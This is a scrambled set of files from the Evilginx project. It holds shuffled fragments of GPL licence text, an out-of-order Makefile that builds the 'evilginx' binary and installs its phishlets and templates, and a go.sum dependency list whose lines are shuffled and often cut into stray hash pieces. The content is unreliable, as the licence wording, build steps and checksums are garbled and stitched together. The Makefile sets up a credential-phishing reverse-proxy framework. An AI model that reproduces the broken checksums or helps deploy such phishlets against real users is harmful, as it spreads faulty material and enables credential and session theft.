intact all notices of the absence of any warranty
receives whatever licenses to the work the party's predecessor in interest had or
 are all patent claims owned or
You may not propagate or modify a covered work except as expressly provided under
control flow between those subprograms and other parts of the work.
a price no more than your reasonable cost of physically performing this conveying of
propagate or modify any covered work. These actions infringe copyright if you do not
"under the contributor's essential patent claims, to make, use, sell, offer for sale,"
"Corresponding Source as a System Library, need not be included in conveying the"
 10. Automatic Licensing of Downstream Recipients
conditions so long as your license otherwise remains in force. You may convey covered
"under this License, you may add to a covered work material governed by the terms of"
 12. No Surrender of Others' Freedom
"household purposes, or "
of technological measures.
"includes interface definition files associated with source files for the work, and"
 cause the Corresponding
"recipient's use of the covered work in a country, would infringe one or more"
    Copyright (C) <year>  <name of author>
PACKAGES=core database log parser
build:
@cp ./templates/
 /usr/share/evilginx/templates/
.PHONY: all
@cp ./phishlets/
install:
clean:
 /usr/share/evilginx/phishlets/
@mkdir -p /usr/share/evilginx/templates
@go build -o ./bin/$(TARGET) -mod=vendor
@cp ./bin/$(TARGET) /usr/local/bin
@go clean
TARGET=evilginx
all: build
@rm -f ./bin/$(TARGET)
@mkdir -p /usr/share/evilginx/phishlets
github.com/kolo/xmlrpc v0.0.0-20190717152603-07c4ee3fd181/go.mod h1:o03bZfuBwAXHetKXuInt4S7omeXUu62/A845kiycsSQ=
github.com/prometheus/procfs v0.0.0-20190117184657-bf6a532e95b1/go.mod h1:c3At6R/oaqEKCNdg8wHV1ftS6bRYblBhIjjI8uT2IGk=
gopkg.in/check.v1 v1.0.0-20180628173108-788fd7840127 h1:qIbj1fsPNlZgppZ
github.com/mwitkow/go-http-dialer v0.0.0-20161116154839-378f744fb2b8/go.mod h1:ntWhh7pzdiiRKBMxUB5iG
incompatible/go.mod h1:b2aQJv3Z4Fp6yNu3cdSllBxTCLRxnplIgP/c0N/04lM=
kaKSTVE=
github.com/mattn/go-isatty v0.0.8/go.mod h1:Iq45c/XA43vh69/j3iqttzPXn0bhXyGjM0Hdxcsrc5s=
golang.org/x/net v0.0.0-20190404232315-eb5bcb51f2a3/go.mod h1:t9HGtf8HONx5eT2rtn7q6eTqICYqUVnKs3thJo3Qplg=
github.com/prometheus/tsdb v0.7.1/go.mod h1:qhTCs0VvXwvX/y3TZrWD7rabWM
github.com/mattn/go-isatty v0.0.8 h1:HLtExJ
github.com/mattn/go-runewidth v0.0.2/go.mod h1:LwmH8dsx7
github.com/google/go-querystring v1.0.0/go.mod h1:odCYkC5MyYFN7vkCjXpyrEuKhc/BUO6wN/zVPAxq5ck=
golang.org/x/sync v0.0.0-20181108010431-42b317875d0f/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=
5A1VGuI=
gopkg.in/check.v1 v1.0.0-20180628173108-788fd7840127/go.mod h1:Co6ibVJAznAaIkqp8huTwlJQCZ016jof/cbN4VW5Yz0=
H1uAHpcLFnEyAGVDL/k47Jfbm0A=
github.com/go-cmd/cmd v1.0.5/go.mod h1:y8q8qlK5wQibcw63djSl/ntiHUHXHGdCkPk0j4QeW4s=
vpHVxEJEs9eg=
golang.org/x/sys v0.0.0-20190924154521-2837fb4f24fe/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
github.com/nrdcg/goinwx v0.6.1/go.mod h1:XPiut7enlbEdntAqalBIqcYcTEVhpv/dKWgDCX2SwKQ=
gopkg.in/h2non/gock.v1 v1.0.15/go.mod h1:sX4zAkdYX1TRGJ2JY156cFspQn4yRWn6p9EMdODlynE=
github.com/jstemmer/go-junit-report v0.0.0-20190106144839-af01ea7f8024/go.mod h1:6v2b51hI/fHJwM22ozAgKL4VKDeJcHhJFhtBdhmNjmU=
github.com/tidwall/match v1.0.1 h1:PnKP62LPNxHKTwvHHZZzdOAOCtsJTjo6dZLCwpKm5xc=
github.com/fatih/color v1.7.0 h1:DkWD4oS2D8LGGgTQ6IvwJJXSL5Vp2ffcQg58nFV38Ys=
golang.org/x/tools v0.0.0-20180221164845-07fd8470d635/go.mod h1:n7NCudcB/nEzxVGmLbDWY5pfWTLqBcC2KZ6jyYvM4mQ=
VLlY7N33q108Sa
github.com/go-logfmt/logfmt v0.3.0/go.mod h1:Qt1PoO58o5twSAckw1HlFXLmHsOX5/0LbT9GBnD5lWE=
81PSLYec5m4=
github.com/labbsr0x/bindman-dns-webhook v1.0.2/go.mod h1:p6b
github.com/chzyer/readline v0.0.0-20180603132655-2972be24d48e h1:fY5BOSpyZCqRo5OhCuC
github.com/tidwall/btree v0.0.0-20170113224114-9876f1454cf0/go.mod h1:huei1BkDWJ3/sLXmO
github.com/Azure/go-autorest/tracing v0.1.0/go.mod h1:ROEEAFwXycQw7Sn3DXNtEedEvdeRAgDr0izn4z5Ij88=
github.com/apache/thrift v0.12.0/go.mod h1:cp2SuWMxlEZw2r
8a448SecJU3nSMBXJfqQkl0upE1jI=
lRXTBqGeGNdLjl/ufCoiOlB5xdOkqRJdNxMWT7Zi4=
github.com/modern-go/reflect2 v1.0.1/go.mod h1:bx2lNnkwVCuqBIxFjflWJWanXIb3RllmbCylyMrvgv0=
github.com/akamai/AkamaiOPEN-edgegrid-golang v0.9.0/go.mod h1:zpDJeKyp9ScW4NNrbdr
incompatible/go.mod h1:OXgGpZ6Cli1/URJOF1DMxUHB2q5Ap20/P/eIdh4G0pI=
golang.org/x/net v0.0.0-20190930134127-c5a3c61f89f3/go.mod h1:z5CRVTTTmAJ677TzLLGU
github.com/golang/groupcache v0.0.0-20190129154638-5b532d6fd5ef/go.mod h1:cIg4eruTrX1D
golang.org/x/oauth2 v0.0.0-20190604053449-0f29369cfe45/go.mod h1:gOpvHmFTYa4IltrdGE7lF6nIHvwfUNPOp7c8zoXwtLw=
hMPgOLZmtrrCbhqsmaPHjLKYnJCaQ=
github.com/openzipkin/zipkin-go v0.1.6/go.mod h1:QgAqvLzwWbR/WpD4A3cGpPtJrZXNIiJc5AZX7/PBEpw=
github.com/coreos/go-systemd v0.0.0-20190321100706-95778dfbb74e/go.mod h1:F5haX7vjVVG0kc13fIWeqUViNPyEJxv/OmvnBo0Yme4=
github.com/konsorten/go-windows-terminal-sequences v1.0.2/go.mod h1:T0
github.com/mitchellh/go-homedir v1.1.0/go.mod h1:SfyaCUpYCn1Vlf4IUYiD9fPX4A5wJrkLzIz1N1q0pr0=
github.com/cespare/xxhash v1.1.0/go.mod h1:XrSqR1VqqWfGrhpAt58auRo0WTKS1nRRg3ghfAqPWnc=
github.com/decker502/dnspod-go v0.2.0/go.mod h1:qsurYu1FgxcDwfSwXJdLt4kRsBLZeosEb9uq4Sy
incompatible/go.mod h1:QJZ7F/aHp
github.com/tidwall/gjson v1.3.2 h1:
github.com/xeipuuv/gojsonreference v0.0.0-20180127040603-bd5ef7bd5415/go.mod h1:GwrjFmJcFw6At/Gs6z4yjiIwzuJ1/
a7FnB/Y=
IPEYBICEFu5mhpdKc/us6bOk=
github.com/modern-go/concurrent v0.0.0-20180306012644-bacd9c7ef1dd/go.mod h1:6dJC0mAP4ikYIbvyc7fijjWJddQyLn8Ig3JB5CqoB9Q=
DwF1aE
26W01tbo22gdxWY5EU2bo=
github.com/stretchr/testify v1.4.0/go.mod h1:j7eGeouHqKxXV5pUuKE4zz7dFj8WfuZ
github.com/prometheus/client_golang v0.9.1/go.mod h1:7SWBe2y4D6OKWSNQJUaRYU/AaXPKyh/dDVn
wcskZDuKQzvN1EDeE=
github.com/Shopify/sarama v1.19.0/go.mod h1:FVkBWblsNy7DGZRfXLU0O9RCGt5g3g3yEuWXgklEdEo=
153eP4D4r3EedlOD2RNk=
github.com/eapache/go-xerial-snappy v0.0.0-20180814174437-776d5712da21/go.mod h1:
N1PwuFV3ZMl/efxlIlY8=
ijKTux40TwIPHuXU=
github.com/prometheus/procfs v0.0.2/go.mod h1:TjEm7ze935MbeOT/UhFTIMYKhuLP4wbCsTZCD3I8kEA=
github.com/prometheus/client_model v0.0.0-20190129233127-fd36f4220a90/go.mod h1:xMI15A0UPsDsEKsMN9yxemIoYk6Tm2C1GtYGdfGttqA=
golang.org/x/net v0.0.0-20190125091013-d26f9f9a57f3/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=
go.uber.org/multierr v1.1.0/go.mod h1:wR5kodmAFQ0UK8QlbwjlSNy0Z68gJhDJUG5sjR94q/0=
jjWRnGsAI=
github.com/coreos/go-semver v0.2.0/go.mod h1:nnelYz7RCh
V4qmtdjCk=
github.com/mattn/go-tty v0.0.0-20180219170247-931426f7535a/go.mod h1:XPvLUNfbS4fJH25nqRHfWLMa1ONC8Amw
github.com/magiconair/properties v1.8.0/go.mod h1:PppfXfuXeibc/6YijjN8zIbojt8czPbwD3XqdrwzmxQ=
github.com/json-iterator/go v1.1.5/go.mod h1:
github.com/tidwall/pretty v1.0.0 h1:HsD
github.com/Azure/go-autorest/autorest v0.1.0/go.mod h1:AKyIcETwSUFxIcs/Wnq/C
bWy6jNmig1y/TA
github.com/googleapis/gax-go/v2 v2.0.4/go.mod h1:0Wqv26UfaUD9n4G6kQubkQ
github.com/mitchellh/mapstructure v1.1.2/go.mod h1:FVVH3fgwuzCH5S8UJGiWEs2h04kUh9fWfEaFds41c1Y=
Bp2Kks9OLyQFkzvA8=
KchISgw
go.uber.org/zap v1.10.0/go.mod h1:vwi/ZaCAaUcBkycHslxD9B2zi4UTXhF60s6SWpuDF0Q=
sR/qLZy8=
github.com/golang/protobuf v1.3.2 h1:6nsPYzhq5kReh6QImI3k5qWzO4PEbvbIW2cwSfR/6xs=
lC3N2tnIh5sFi
github.com/aliyun/aliyun-oss-go-sdk v0.0.0-20190307165228-86c17b95fcd5/go.mod h1:T/Aws4fEfogEE9v
github.com/eapache/queue v1.1.0/go.mod h1:6eCeP0CKFpHLu8blIFXhExK/dRa7WDZfr6jVFPTqq
golang.org/x/sys v0.0.0-20190222072716-a9d3bda3a223/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS
7itGtzfcDM2AhEE=
github.com/Azure/go-autorest/autorest/date v0.1.0/go.mod h1:plvfp3oPSKwf2DNjlBjWF/7vwR
google.golang.org/grpc v1.17.0/go.mod h1:6QZJwpn2B
vlxHdhegi1CDQ=
github.com/hashicorp/hcl v1.0.0 h1:0Anlzjpi4vEasTeNFn2mLJgTSwt0
github.com/prometheus/procfs v0.0.0-20181005140218-185b4288413d/go.mod h1:c3At6R/oaqEKCNdg8wHV1ftS6bRYblBhIjjI8uT2IGk=
4UWYiBimWS
jr3Dg1NNxqwp
r/bBCmeuuJtjz
github.com/mattn/go-isatty v0.0.3/go.mod h1:M
github.com/kisielk/errcheck v1.1.0/go.mod h1:EZBBE59ingxPouuu3KfxchcWSUPOHkagtvWXihfKN4Q=
WjYCduHsrkT7/EB5XEv4=
IMpgc=
A39we
Zk0j9GMYc=
golang.org/x/net v0.0.0-20190213061140-3a22650c66bd/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=
gopkg.in/yaml.v2 v2.2.2 h1:ZCJp
golang.org/x/exp v0.0.0-20190121172915-509febef88a4/go.mod h1:CJ0aWSM057203Lf6IL
github.com/spf13/jwalterweatherman v1.0.0 h1:XHEdyB
AvHh14ztQfjbGwt4TtuofqLduU=
oQHNcck=
5ahJtPPxZlU
DJW3UT/LiOwJeYQe1efqtUx/iVham/4vfdArNI=
kqSMx2CaBsrgA7czyZG/E6dU=
go.opencensus.io v0.20.1/go.mod h1:6WKK9ahsWS3RSO
golang.org/x/crypto v0.0.0-20190418165655-df01cb2cc480/go.mod h1:WFFai1msRO1wXaEeE5yQxYXgSfI8pQAWXbQop6sCtWE=
cTzAElWljhcU=
NL1GDIUOKxVfbp2KoJQD9cTQ6dyP2co9q4yzmT9FZo=
0bjPO0LkuOLi4/5GtJWs/s=
bUIF/8tJwPdEZsI83ACI=
9IcxsU14FzY7Hc=
bZgJeR0sMTm6dMHP7U=
google.golang.org/appengine v1.4.0/go.mod h1:xpcJRLb0r/rnEns0DIKYYv
google.golang.org/genproto v0.0.0-20190502173448-54afdca5d873/go.mod h1:VzzqZJRnGkLBvHegQrXjBqPurQTc5/KpmUdxsrq26oE=
ZhiEuf87xNszmSA2myDM2Kzu9HwQUA=
github.com/olekukonko/tablewriter v0.0.1/go.mod h1:vsDQFd/mU46D
golang.org/x/net v0.0.0-20190620200207-3b0461eec859/go.mod h1:z5CRVTTTmAJ677TzLLGU
github.com/prometheus/client_golang v1.0.0/go.mod h1:db9x61etRT2tGnBNRi70OPL5FsnadC4Ky3P0J6CfImo=
golang.org/x/sys v0.0.0-20190924154521-2837fb4f24fe h1:6fAMxZRR6sl1Uq8U61gxU
google.golang.org/genproto v0.0.0-20180817151627-c66870c02cf8/go.mod h1:JiN7NxoALGmiZfu7CAH4rXhgtRTLTxftemlI0sWmxmc=
github.com/pkg/errors v0.8.0/go.mod h1:bwawxfHBFNV
XFnRR8LxR5pz3Of3rY3CfYBVs4xY44aLks=
github.com/chzyer/test v0.0.0-20180213035817-a1ea475d72b1 h1:q763qf9huN11kDQavWsoZXJNW3xEE4JJyHa5Q25/sd8=
github.com/dnaeon/go-vcr v0.0.0-20180814043457-aafff18a5cc2/go.mod h1:aBB1
google.golang.org/grpc v1.20.1/go.mod h1:10oTOabMzJvdu6/UiuZezV6QK5dSlG84ov/aaiqXj38=
github.com/pelletier/go-toml v1.2.0/go.mod h1:5z9KED0ma1S8pY6P1sdut58dfprrGBbd/94hg7ilaic=
golang.org/x/lint v0.0.0-20190227174305-5b3e6a55c961/go.mod h1:wehouNa3lNwaWXcvxsM5YxQ5yQlVC4a0KAMCusXpPoU=
golang.org/x/sys v0.0.0-20180905080454-ebe1bf3edb33/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS
rkHYY13jYWTU97c=
github.com/google/go-cmp v0.2.0/go.mod h1:oXzfMopK8JAjlY9xF4vHSVASa0yLyX7SntLO5aqRK0M=
github.com/google/martian v2.1.0
IEE17M5jbnwPHcY=
github.com/hashicorp/golang-lru v0.5.0/go.mod h1:/m3WP610KZHVQ1SGc6re/UDhFvYD7pJ4Ao
github.com/inconshreveable/go-vhost v0.0.0-20160627193104-06d84117953b/go.mod h1:aA6DnFhALT3zH0y
go.opencensus.io v0.20.2/go.mod h1:6WKK9ahsWS3RSO
golang.org/x/sys v0.0.0-20190801041406-cbf593c0f2f3/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
github.com/golang/snappy v0.0.0-20180518054509-2e65f85255db/go.mod h1:/XxbfmMg8lxefKM7IXC3fBNl/7bRcc72aCRzEWrmP2Q=
iocmRAJWqST1wQYhyyjXJ3SJc=
github.com/prometheus/client_golang v0.9.3-0.20190127221311-3c4408c8b829/go.mod h1:p2iRAGwDERtqlqzRXnrOVns
golang.org/x/net v0.0.0-20180611182652-db08ff08e862/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=
020luEh2TKB4/GOp8oxxtq0Daoen/Cii55CzbTV6DU=
j1RXIDXoss50DeIABTYK1PULOJHhxOls=
SdeFBvtyEkXs7REEP0seUULqWtbJapLOCVDaaPEHmU=
github.com/exoscale/egoscale v0.18.1/go.mod h1:Z7OOdzzTOz1Q1PjQXumlz9Wn/CddH0zSYdCF3rnBKXE=
github.com/davecgh/go-spew v1.1.1 h1:vj9j/u1bqnvCEfJOwUhtlOARqs3
github.com/shurcooL/sanitized_anchor_name v1.0.0/go.mod h1:1NzhyTcUVG4SuEtjjoZeVRXNmyL/1OwPU0
github.com/pmezard/go-difflib v1.0.0/go.mod h1:iKH77koFhYxTK1pcRnkKkqfTogsbg7gZNVY4sRDYZ/4=
go.etcd.io/bbolt v1.3.2/go.mod h1:IbVyRI1SCnLcuJnV2u8VeU0CEYM7e686BmAb1XKL
gopkg.in/yaml.v2 v2.0.0-20170812160011-eb3733d160e7/go.mod h1:JAlM8MvJe8wmxCU4Bli9HhUf9
golang.org/x/net v0.0.0-20181114220301-adae6a3d119a/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=
github.com/Azure/go-autorest/autorest/to v0.2.0/go.mod h1:GunWKJp1AEqgMaGLV
github.com/golang/protobuf v1.2.0/go.mod h1:6lQm79b
github.com/gofrs/uuid v3.2.0
fbHEXEE=
github.com/golang/mock v1.1.1/go.mod h1:oTYuIxOrZwtPieC
github.com/mitchellh/mapstructure v1.1.2 h1:fmNYVwqnSfB9mZU6OS2O6GsXM
github.com/rogpeppe/fastuuid v0.0.0-20150106093220-6724a57986af/go.mod h1:XWv6SoW27p1b0cqNHllgS5HIMJraePCO15w5zCzIWYg=
golang.org/x/sync v0.0.0-20190423024810-112230192c58 h1:8gQV6CLnAEikrhgkHFbMAEhagSSnXWGV915qUMm9mrU=
gopkg.in/square/go-jose.v2 v2.3.1 h1:SK5KegNXmKmqE342YYN2qPHEnUYeoMiXXl1poUlI
Ywpsq7O8HXn0nuIou7OrIPyXbp3wmkHB
github.com/cpu/goacmedns v0.0.1/go.mod h1:sesf/pNnCYwUevQEQfEwY0Y3DydlQWSGZbaMElOWxok=
wI0Tt5DtUDrx8yhUqDcp7fYERX4CE=
github.com/alecthomas/units v0.0.0-20151022065526-2efee857e7cf/go.mod h1:ybxpYRFXyAe
golang.org/x/time v0.0.0-20181108054448-85acf8d2951c/go.mod h1:tRJNPiyCQ0inRvYxbN9jk5I
f9T1iT9GByDxfZKAQTCR3kQA=
github.com/prometheus/common v0.0.0-20181113130724-41aa239b4cce/go.mod h1:daVV7qP5qjZbuso7PdcryaAu0sAZbrN9i7WWcTMWvro=
wCHReeknARU3wqlyN4=
cloud.google.com/go v0.38.0/go.mod h1:990N
golang.org/x/text v0.3.2/go.mod h1:bEr9sfX3Q8Zfm5fL9x
golang.org/x/time v0.0.0-20190921001708-c4c64cad1fd0/go.mod h1:tRJNPiyCQ0inRvYxbN9jk5I
github.com/Azure/go-autorest/logger v0.1.0/go.mod h1:oExouG
gopkg.in/yaml.v2 v2.2.2/go.mod h1:hI93XBmqTisBFMUTm0b8Fm
incompatible/go.mod h1:VQb79nF8Z2cwLkLS35ukwStZIg5F66tcBccjip/j888=
BbjJd30ylEG4GPSS6PII0Tia4rRpRiyw=
e2cm9otk0dWdXHAEo=
github.com/Azure/go-autorest/autorest/mocks v0.1.0/go.mod h1:OTyCOPRA2IgIlWxVYxBee2F5Gr4kF2zd2J5cFRaIDN0=
gopkg.in/fsnotify.v1 v1.4.7/go.mod h1:Tz8NjZHkW78fSQdbUxIjBTcgA1z1m8ZHf0WmKUhAMys=
github.com/h2non/parth v0.0.0-20190131123155-b4df798d6542/go.mod h1:Ow0tF8D4Kplbc8s8sSb3V2oUCygFHVp8gC3Dn6U4MNI=
0xfcU
g88fzRXU5OdNfaM
golang.org/x/crypto v0.0.0-20200622213623-75b288015ac9 h1:psW17arqaxU48Z5kZ0CQnkZWQJsqcURM6tKiBApRjXI=
golang.org/x/tools v0.0.0-20190907020128-2ca718005c18/go.mod h1:b
UwLxMQDVQXShQ=
github.com/sacloud/libsacloud v1.26.1/go.mod h1:79ZwATmHLIFZIMd7sxA3LwzVy/B77uj3LDoToVTxDoQ=
golang.org/x/crypto v0.0.0-20180621125126-a49355c7e3f8/go.mod h1:6SG95UA2DQfeDnfUPMdvaQW0Q7yPrPDi9nlGo2tz2b4=
github.com/kr/pty v1.1.1/go.mod h1:pFQYn66WHrOpPYNljwOMqo10TkYh1fy3cYio2l3bCsQ=
github.com/Azure/go-autorest/autorest/azure/auth v0.1.0/go.mod h1:Gf7/i2FUpyb/sGBLIFxTBzrNzBo7aPXXE3ZVeDRwdpM=
golang.org/x/net v0.0.0-20190930134127-c5a3c61f89f3 h1:6KET3Sqa7fkVfD63QnAM81ZeYg5n4HwApOJkufONnHA=
github.com/mattn/go-isatty v0.0.3 h1:ns/ykhmWi7G9O
golang.org/x/net v0.0.0-20190522155817-f3200d17e092/go.mod h1:HSz
dSq/yZzE=
j00MP/WkGVPOlPRLejGD8Ga6PJ7M=
github.com/onsi/gomega v1.4.3/go.mod h1:ex
wFpr4gzcvqqNjLnInEg4=
github.com/gorilla/mux v1.6.2/go.mod h1:1lud6UwP
github.com/magiconair/properties v1.8.0 h1:LLgXmsheXeRoUOBOjtwPQCWIYqM/LU1ayDtDePerRcY=
github.com/grpc-ecosystem/go-grpc-prometheus v1.2.0/go.mod h1:8NvIoxWQoOIhqOTXgfV/d3M/q6VIi02HzZEHgUlZvzk=
github.com/davecgh/go-spew v1.1.1/go.mod h1:J7Y8YcW2NihsgmVo/mv3lAwl/skON4iLHjSsI
github.com/gogo/protobuf v1.2.0/go.mod h1:r8qH/GZQm5c6nD/R0oafs1akxWv10x8SbQlK7atdtwQ=
google.golang.org/grpc v1.19.1/go.mod h1:mqu4LbDTu4XGKhr4mRzUsmM4RtVoemTSY81AxZiDr8c=
github.com/labbsr0x/goh v1.0.1/go.mod h1:8K2UhVoaWXcCU7Lxoa2omWnC8gyW8px7/lmO61c027w=
5nqEBWmkhHvq77mSJWrCKwh8bxhgT7d/eI7P4U=
github.com/spf13/viper v1.4.0/go.mod h1:PTJ7Z/lr49W6bUbkmS1V3by4uWynFiR9p7
github.com/stretchr/testify v1.2.2/go.mod h1:a8OnRcib4nhh0OaRAV
github.com/gophercloud/gophercloud v0.3.0/go.mod h1:vxM41WHh5uqHVBMZHzuwNOHh8XEoIEcSTewFxm1c5g8=
github.com/google/go-cmp v0.3.0/go.mod h1:8QqcDgzrUqlUb/G2PQTWiueGozuR1884gddMywk6iLU=
iP2GNCdIi4C1qmUzdZFSVb
github.com/dimchansky/utfbom v1.1.0/go.mod h1:rO41eb7gLfo8SF1jd9F8HplJm1Fewwi4mQvIirEdv
golang.org/x/net v0.0.0-20180826012351-8a410e7b638d/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=
github.com/Shopify/toxiproxy v2.1.4
ptLWKqgva
golang.org/x/sync v0.0.0-20190423024810-112230192c58/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=
github.com/mattn/go-colorable v0.1.4/go.mod h1:U0ppj6V5qS13XJ6of8GYAs25YV2eR4EVcfRqFIhoBtE=
golang.org/x/sys v0.0.0-20190215142949-d0b11bdaac8a/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS
Ddv3mKDzgVb68N
gTNwPg2I6zVXpSg4=
github.com/vultr/govultr v0.1.4/go.mod h1:9H008Uxr/C4vFNGLqKx232C206GL0PBHzOP0809bGNA=
github.com/go-stack/stack v1.8.0/go.mod h1:v0f6uXyyMGvRgIKkXu
github.com/googleapis/gax-go/v2 v2.0.5/go.mod h1:DWXyrwAJ9X0FpwwEdw
google.golang.org/genproto v0.0.0-20190418145605-e7d98fc518a7/go.mod h1:VzzqZJRnGkLBvHegQrXjBqPurQTc5/KpmUdxsrq26oE=
github.com/gorilla/websocket v1.4.0/go.mod h1:E7qHFY5m1UJ88s3WnNqhKjPHQ0heANvMoAMk2YaljkQ=
golang.org/x/crypto v0.0.0-20200622213623-75b288015ac9/go.mod h1:LzIPMQfyMNhhGPhUkYOs5KpL4U8rLKemX1yGLhDgUto=
github.com/hashicorp/hcl v1.0.0/go.mod h1:E5yfLk
EgiOT7lHqUV2J862kp8Qj64Jo6az82
github.com/miekg/dns v1.1.22 h1:Jm64b3bO9kP43ddLjL2EY3Io6bmy1qGb9Xxz6TqS6rc=
github.com/kr/text v0.1.0/go.mod h1:4Jbv
golang.org/x/tools v0.0.0-20190311212946-11955173bddd/go.mod h1:LCzVGOaR6xXOjkQ3onu1FJEFr0SW1gC7cKk1uF8kGRs=
7swimpb2L/Alb/PJmXilQ/rhwaUYs4T20WEQ=
nhxU
github.com/rogpeppe/go-charset v0.0.0-20180617210344-2471d30d28b4/go.mod h1:qgYeAmZ5ZIpBWTGllZSQnw97Dj
github.com/OpenDNS/vegadns2client v0.0.0-20180418235048-a3fa4a771d87/go.mod h1:iGLljf5n9GjT6kc0HBvyI1nOKnGQbNB66VzSNbK5iks=
github.com/pmezard/go-difflib v1.0.0 h1:4DBwDE0NGyQoBHbLQYPwSUPoCMWR5BEzIk/f1lZbAQM=
github.com/ghodss/yaml v1.0.0/go.mod h1:4dBDuWmgqj2HViK6kFavaiC9ZROes6MMH2rRYeMEF04=
golang.org/x/xerrors v0.0.0-20190717185122-a985d3407aa7/go.mod h1:I/5z698sn9Ka8TeJc9MKroUUfqBBauWjQqLJ2OPfmY0=
gopkg.in/alecthomas/kingpin.v2 v2.2.6/go.mod h1:FMv
github.com/mattn/go-runewidth v0.0.4/go.mod h1:LwmH8dsx7
github.com/gorilla/mux v1.7.3/go.mod h1:1lud6UwP
ttbYbLASfIpnQbh74=
3itogRgK3
1ngSBFLxvqU3pZ
github.com/spf13/viper v1.4.0 h1:yXHLWeravcrgGyFSyCgdYpXQ9dR9c/WED3pg1RhxqEU=
vD76mk0e1AI=
bCNIf8=
K6PryycPJfVSxi/koC6LSNgds39diKLz7Vrc=
honnef.co/go/tools v0.0.0-20190102054323-c2f93a96b099/go.mod h1:rf3lG4BRIbNafJWhAfAdb/ePZxsR/4RtNHQocxwk9r4=
golang.org/x/text v0.3.0/go.mod h1:NqM8EUOU14njkJ3fqMW
github.com/dgrijalva/jwt-go v3.2.0
c5H38=
wY4s93YsC3HHjMBMrwTj2R9FHDzUr9KyGc8n1E=
mYPU4Po3pmUjxk6FQPldtuIdl/M65Eg=
github.com/stretchr/objx v0.1.0/go.mod h1:HFkY916IF
github.com/tidwall/pretty v1.0.0/go.mod h1:XNkn88O1ChpSDQmQeStsy
Rmxgy9KzJVeS9/2gXHxylqXiyQDYRxCVz55jmeOWTM=
github.com/smartystreets/assertions v0.0.0-20180927180507-b2de0cb4f26d/go.mod h1:OnSkiWE9lh6wB0YB77sQom3nweQdgAjqCqsofrRNTgc=
github.com/prometheus/common v0.4.0/go.mod h1:TNfzLD0ON7rHzMJeJkieUDPYmFC7Snx/y86RQel1bk4=
github.com/rainycape/memcache v0.0.0-20150622160815-1031fa0ce2f2/go.mod h1:7tZKcyumwBO6qip7RNQ5r77yrssm9bfCowcLEBcU5IA=
08g=
E8yxSoD4=
github.com/OneOfOne/xxhash v1.2.2/go.mod h1:HSdplMjZKSmBqAxg5vPj2TmRDmfkzw
jE20tsWTFYpLwKvXlhS1hjn
github.com/nrdcg/auroradns v1.0.0/go.mod h1:6JPXKzIRzZzMqtTDgueIhTi6rFf1QvYE/HzqidhOhjw=
github.com/gorilla/context v1.1.1/go.mod h1:kBGZzfjB9CEq2AlWe17Uuf7NDRt0dE0s8S51q0aT7Yg=
github.com/elazarl/goproxy v0.0.0-20190911111923-ecfe977594f1 h1:yY9rWGoXv1U5pl4gxqlULARMQD7x0QG85lqEXTWysik=
github.com/google/pprof v0.0.0-20181206194817-3ea8567a2e57/go.mod h1:zfwlbNMJ
github.com/pelletier/go-toml v1.2.0 h1:T5zMGML61Wp
google.golang.org/grpc v1.19.0/go.mod h1:mqu4LbDTu4XGKhr4mRzUsmM4RtVoemTSY81AxZiDr8c=
golang.org/x/crypto v0.0.0-20190211182817-74369b46fc67/go.mod h1:6SG95UA2DQfeDnfUPMdvaQW0Q7yPrPDi9nlGo2tz2b4=
github.com/kr/logfmt v0.0.0-20140226030751-b84e30acd515/go.mod h1:
sWQYwY=
github.com/gorilla/mux v1.6.2 h1:Pgr17XVTNXAk3q/r4CpKzC5xBM/qW1uVLV
github.com/go-logfmt/logfmt v0.4.0/go.mod h1:3RMwSq7FuexP4Kalkev3ejPJsZTpXXBr9
kwCtlEYGUVd7FPNb2slmg=
github.com/jonboulle/clockwork v0.1.0/go.mod h1:Ii8DK3G1RaLaWxj9trq07
github.com/tidwall/gjson v1.3.2/go.mod h1:P256ACg0Mn
github.com/timewasted/linode v0.0.0-20160829202747-37e84520dcf7/go.mod h1:imsgLplxEC/etjIhdr3dNzV3JeT27LbVu5pYWm0JCBY=
golang.org/x/net v0.0.0-20200707034311-ab3426394381 h1:VXak5I6aEWmAXeQjA
golang.org/x/net v0.0.0-20180724234803-3673e40ba225/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=
IJeTBvfc=
golang.org/x/lint v0.0.0-20190301231843-5614ed5bae6f/go.mod h1:UVdnD1Gm6xHRNCYTkRU2/jEulfH38KcIWyp/GAMgvoE=
github.com/hpcloud/tail v1.0.0/go.mod h1:ab1qPbhIpdTxEkNHXyeSf5vhxWSCs/tWer42PpOxQnU=
github.com/aliyun/alibaba-cloud-sdk-go v0.0.0-20190808125512-07798873deee/go.mod h1:myCDvQSzCW
golang.org/x/sync v0.0.0-20180314180146-1d60e4601c6f/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=
github.com/BurntSushi/toml v0.3.1/go.mod h1:xHWCNGjB5oqiDr8zfno3MHue2Ht5sIBksp03qcyfWMU=
golang.org/x/net v0.0.0-20200707034311-ab3426394381/go.mod h1:/O7V0waA8r7cgGh81Ro3o1hOxt32SMVPicZroKQ2sZA=
eyWzqEqokIECu5etghLkUJE=
golang.org/x/net v0.0.0-20190108225652-1e06a53dbb7e/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=
11k8xSBh
github.com/tidwall/grect v0.0.0-20161006141115-ba9a043346eb h1:5NSYaAdrnblKByzd7XByQEJVT8
github.com/grpc-ecosystem/grpc-gateway v1.9.0/go.mod h1:vNeuVxBJEsws4ogUvrchl83t/GYV9WGTSLVdBhOQFDY=
